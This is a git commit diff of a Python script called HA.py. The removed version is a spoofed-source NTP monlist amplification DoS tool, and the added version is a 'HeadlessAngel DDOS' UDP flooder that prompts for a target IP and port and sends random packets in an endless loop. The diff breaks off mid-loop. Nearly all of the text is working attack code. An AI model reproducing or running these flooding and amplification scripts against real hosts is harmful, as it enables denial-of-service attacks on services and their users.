b7b698d13ebeb67c090d40b47bccf2f14e102ee6
FallenAngel <87920231+FallenAngel07@users.noreply.github.com>
2021-09-15 00:53:33 +0800

    Update HA.py

--- HA.py
+++ HA.py
@@ -1,77 +1,47 @@
-#!/usr/bin/env python
-from scapy.all import *
-import sys
-import threading
-import time
-#NTP Amp DOS attack
-#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
-#FOR USE ON YOUR OWN NETWORK ONLY
+import sys 
+import os 
+import time 
+import socket
+import random
+#code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-#packet sender
-def deny():
-#Import globals to function
-global ntplist
-global currentserver
-global data
-global target
-ntpserver = ntplist[currentserver] #Get new server
-currentserver = currentserver + 1 #Increment for next
-packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
-send(packet,loop=1) #SEND IT
+os.system("clear")
+os.system("figlet HeadlessAngel DDOS")
+print
+print "Author   : Fallen Angel"
+print "Team : Headless Angel"
+print 
+ip = raw_input("Target IP : ")
+port = input("Enter Port    : ")
 
-#So I dont have to have the same stuff twice
-def printhelp():
-print "HeadlessAngel DOS Attack"
-print "By FallenAngel"
-print "Usage HA.py <target ip> <ntpserver list> <number of threads>"
-print "ex: ex: HA.py 1.2.3.4 file.txt 10"
-print "NTP serverlist file should contain one IP per line"
-print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
-exit(0)
-
-if len(sys.argv) < 4:
-printhelp()
-#Fetch Args
-target = sys.argv[1]
-
-#Help out idiots
-if target in ("help","-h","h","?","--h","--help","/?"):
-printhelp()
-
-ntpserverfile = sys.argv[2]
-numberthreads = int(sys.argv[3])
-#System for accepting bulk input
-ntplist = []
-currentserver = 0
-with open(ntpserverfile) as f:
-    ntplist = f.readlines()
-
-#Make sure we dont out of bounds
-if numberthreads > int(len(ntplist)):
-print "Attack Aborted: More threads than servers"
-print "Next time dont create more threads than servers"
-exit(0)
-
-#Magic Packet aka NTP v2 Monlist Packet
-data = "\x17\x00\x03\x2a" + "\x00" * 4
-
-#Hold our threads
-threads = []
-print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
-print "Use CTRL+C to stop attack"
-
-#Thread spawner
-for n in range(numberthreads):
-    thread = threading.Thread(target=deny)
-    thread.daemon = True
-    thread.start()
-
-    threads.append(thread)
-
-#In progress!
-print "Sending..."
-
-#Keep alive so ctrl+c still kills all them threads
+os.system("clear")
+os.system("figlet HA DDOS Running")
+print "[+]--                        [+]0% "
+time.sleep(2)
+print "[+]-xxxx>                    [+]25%"
+time.sleep(2)
+print "[+]-xxxxxxx>                 [+]50%"
+time.sleep(3)
+print "[+]-xxxxxxxxx>               [+]75%"
+time.sleep(2)
+print "[+]-xxxxxxxxxxxxxx>          [+]100%"
+time.sleep(2)
+sent = 0
 while True:
-time.sleep(1)
+    sock.sendto(bytes, (ip,port))
+    sent = sent + 1
+    port = port + 1
+    print "HeadlessAngle :-Sent %s packet to %s through port:%s"%(sent,ip,port)
+    if port == 65534:
